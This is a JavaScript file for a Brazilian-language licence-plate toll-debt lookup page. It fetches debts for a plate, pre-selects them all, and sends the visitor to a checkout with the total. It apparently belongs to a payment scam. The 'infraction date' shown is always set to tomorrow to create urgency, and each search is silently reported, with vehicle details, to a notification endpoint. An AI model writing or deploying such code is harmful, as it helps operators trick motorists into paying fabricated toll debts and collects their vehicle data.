(function(){
  var params = new URLSearchParams(location.search);
  var plate = (params.get('plate') || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
  var plateFormatted = plate.length >= 7 ? plate.substring(0, 3) + '-' + plate.substring(3) : plate;
  var selectedDebits = [];
  var latestDebits = [];

  var loadingPlateEl = document.getElementById('loadingPlate');
  if (loadingPlateEl && plateFormatted) loadingPlateEl.textContent = plateFormatted;

  function formatMoney(value){
    var number = Number(value) || 0;
    return 'R$ ' + number.toFixed(2).replace('.', ',');
  }

  function escapeHtml(value){
    return String(value || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function hideLoading(){
    var overlay = document.getElementById('loadingOverlay');
    if(!overlay) return;
    overlay.style.opacity = '0';
    overlay.style.transition = 'opacity 0.35s';
    setTimeout(function(){ overlay.style.display = 'none'; }, 350);
  }

  function showMain(){
    var mainContent = document.getElementById('mainContent');
    if(mainContent) mainContent.style.display = 'block';
  }

  function showError(message){
    var lista = document.getElementById('listaDebitos');
    showMain();
    hideLoading();
    if (!lista) return;

    lista.innerHTML = ''
      + '<li class="row" style="grid-template-columns:1fr;padding:18px 8px">'
      +   '<div>'
      +     '<strong>Não foi possível consultar os débitos.</strong>'
      +     '<div style="font-size:14px;color:#6b7280;margin-top:6px;line-height:1.5">' + escapeHtml(message || 'Tente novamente em instantes.') + '</div>'
      +   '</div>'
      + '</li>';

    document.getElementById('totalValue').textContent = formatMoney(0);
    document.getElementById('modalValor').textContent = formatMoney(0);
    sessionStorage.removeItem('selectedDebits');
    sessionStorage.setItem('debitoTotal', '0');

    var btnContinuar = document.getElementById('btnContinuar');
    if (btnContinuar) {
      btnContinuar.disabled = true;
      btnContinuar.style.opacity = '0.6';
      btnContinuar.style.cursor = 'not-allowed';
    }
  }

  function setCheckedAt(){
    var now = new Date();
    var dd = String(now.getDate()).padStart(2, '0');
    var mm = String(now.getMonth() + 1).padStart(2, '0');
    var yyyy = now.getFullYear();
    var hh = String(now.getHours()).padStart(2, '0');
    var mi = String(now.getMinutes()).padStart(2, '0');
    var checkedAtEl = document.getElementById('debitoCheckedAt');
    if (checkedAtEl) checkedAtEl.textContent = dd + '/' + mm + '/' + yyyy + ' - ' + hh + ':' + mi;
  }

  function setVehicleField(){
    var vehicleInfo = JSON.parse(sessionStorage.getItem('vehicleData') || '{}');
    var input = document.getElementById('qPlaca');
    if (!input) return;

    if (vehicleInfo.brand && vehicleInfo.model) {
      var vehicleText = vehicleInfo.brand + ' ' + vehicleInfo.model + (vehicleInfo.year ? ' · ' + vehicleInfo.year : '');
      input.value = plateFormatted + '  —  ' + vehicleText;
      input.style.fontSize = '14px';
      return;
    }

    input.value = plateFormatted;
  }

  function setInfractionDate(){
    var tomorrow = new Date(Date.now() + 86400000);
    var td = String(tomorrow.getDate()).padStart(2, '0');
    var tm = String(tomorrow.getMonth() + 1).padStart(2, '0');
    var ty = tomorrow.getFullYear();
    var dataInfracaoEl = document.getElementById('dataInfracao');
    if (dataInfracaoEl) dataInfracaoEl.textContent = td + '/' + tm + '/' + ty;
  }

  function updateTotal(){
    selectedDebits = latestDebits.filter(function(item){ return !!item.selected; });
    var total = selectedDebits.reduce(function(sum, item){ return sum + (Number(item.valor) || 0); }, 0);
    total = Math.round(total * 100) / 100;

    document.getElementById('totalValue').textContent = formatMoney(total);
    document.getElementById('modalValor').textContent = formatMoney(total);
    sessionStorage.setItem('debitoTotal', String(total));
    sessionStorage.setItem('selectedDebits', JSON.stringify(selectedDebits));

    var btnContinuar = document.getElementById('btnContinuar');
    if (btnContinuar) {
      btnContinuar.disabled = total <= 0;
      btnContinuar.style.opacity = total <= 0 ? '0.6' : '1';
      btnContinuar.style.cursor = total <= 0 ? 'not-allowed' : 'pointer';
    }

    var bulk = document.getElementById('checkAll');
    if (bulk) bulk.checked = latestDebits.length > 0 && selectedDebits.length === latestDebits.length;
  }

  function renderDebits(debitos){
    var lista = document.getElementById('listaDebitos');
    if (!lista) return;

    latestDebits = debitos.map(function(item){
      return Object.assign({}, item, { selected: true });
    });

    if (!latestDebits.length) {
      lista.innerHTML = ''
        + '<li class="row" style="grid-template-columns:1fr;padding:18px 8px">'
        +   '<div>'
        +     '<strong>Nenhum débito encontrado para esta placa.</strong>'
        +     '<div style="font-size:14px;color:#6b7280;margin-top:6px">Se a placa estiver correta, tente consultar novamente em alguns minutos.</div>'
        +   '</div>'
        + '</li>';
      updateTotal();
      return;
    }

    lista.innerHTML = latestDebits.map(function(item, index){
      var descricao = [];
      if (item.concessionaria) descricao.push(item.concessionaria);
      if (item.dataHora) descricao.push(item.dataHora);

      return ''
        + '<li class="row">'
        +   '<input type="checkbox" class="debito-checkbox" data-index="' + index + '" checked>'
        +   '<div>'
        +     '<strong>Débito #' + escapeHtml(item.id) + '</strong>'
        +     '<div style="font-size:14px;color:#6b7280;margin-top:4px">' + escapeHtml(descricao.join(' · ')) + '</div>'
        +   '</div>'
        +   '<div style="font-weight:700;font-size:18px;color:#000;text-align:right">' + formatMoney(item.valor) + '</div>'
        + '</li>';
    }).join('');

    updateTotal();
  }

  function setupCheckboxes(){
    var lista = document.getElementById('listaDebitos');
    var bulk = document.getElementById('checkAll');

    if (lista) {
      lista.addEventListener('change', function(e){
        if (!e.target.classList.contains('debito-checkbox')) return;
        var index = Number(e.target.getAttribute('data-index'));
        if (!isNaN(index) && latestDebits[index]) {
          latestDebits[index].selected = !!e.target.checked;
          updateTotal();
        }
      });
    }

    if (bulk) {
      bulk.addEventListener('change', function(){
        var checked = !!this.checked;
        latestDebits.forEach(function(item){ item.selected = checked; });
        document.querySelectorAll('.debito-checkbox').forEach(function(cb){ cb.checked = checked; });
        updateTotal();
      });
    }
  }

  function setupButtons(){
    var btnContinuar = document.getElementById('btnContinuar');
    if (btnContinuar) {
      btnContinuar.onclick = function(){
        var total = selectedDebits.reduce(function(sum, item){ return sum + (Number(item.valor) || 0); }, 0);
        total = Math.round(total * 100) / 100;
        if (total <= 0) return;

        document.getElementById('atencaoModal').classList.add('is-open');
        document.getElementById('btnEntendi').setAttribute('data-checkout-url', 'checkout.html?plate=' + encodeURIComponent(plateFormatted) + '&amount=' + total.toFixed(2));
      };
    }

    function closeModal(){ document.getElementById('atencaoModal').classList.remove('is-open'); }
    function goBack(){ closeModal(); location.href = 'pedagio.html'; }

    var btnCancelar = document.getElementById('btnCancelar');
    var btnEntendi = document.getElementById('btnEntendi');
    var modalOverlay = document.getElementById('modalOverlay');

    if (btnCancelar) btnCancelar.onclick = goBack;
    if (btnEntendi) btnEntendi.onclick = function(){
      var url = this.getAttribute('data-checkout-url');
      if (url) location.href = url;
      else closeModal();
    };
    if (modalOverlay) modalOverlay.onclick = closeModal;
  }

  function notifyPlateSearch(total){
    var vehicleData = JSON.parse(sessionStorage.getItem('vehicleData') || '{}');
    fetch('/api/notify/plate-search', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.assign({ plate: plateFormatted, amount: total }, vehicleData))
    }).catch(function(){});
  }

  function initPage(data){
    setVehicleField();
    setCheckedAt();
    setInfractionDate();
    renderDebits(data.debitos || []);
    notifyPlateSearch(data.total || 0);
    showMain();
    hideLoading();
  }

  function loadDebits(){
    if (!plate) {
      showError('A placa informada é inválida. Volte e digite novamente.');
      return;
    }

    fetch('/api/plate-debts?plate=' + encodeURIComponent(plate))
      .then(function(response){ return response.json(); })
      .then(function(data){
        if (!data || data.success === false) {
          throw new Error((data && data.error) || 'Não foi possível consultar os débitos da placa.');
        }
        initPage(data);
      })
      .catch(function(error){
        console.error('Erro ao consultar débitos:', error);
        showError(error.message || 'Falha ao buscar os débitos da placa.');
      });
  }

  var heroStrap = document.querySelector('.hero-strap');
  if(heroStrap) {
    heroStrap.style.backgroundImage = "url('https://i.imgur.com/MUtzfrj.jpeg')";
    heroStrap.style.backgroundSize = 'cover';
    heroStrap.style.backgroundPosition = 'center';
    heroStrap.style.backgroundAttachment = 'fixed';
    heroStrap.style.backgroundRepeat = 'no-repeat';
    heroStrap.style.minHeight = '300px';
    heroStrap.style.height = '300px';

    var svg = heroStrap.querySelector('svg');
    if(svg) {
      svg.style.opacity = '0.3';
      svg.style.mixBlendMode = 'overlay';
    }
  }

  setupCheckboxes();
  setupButtons();
  loadDebits();
})();
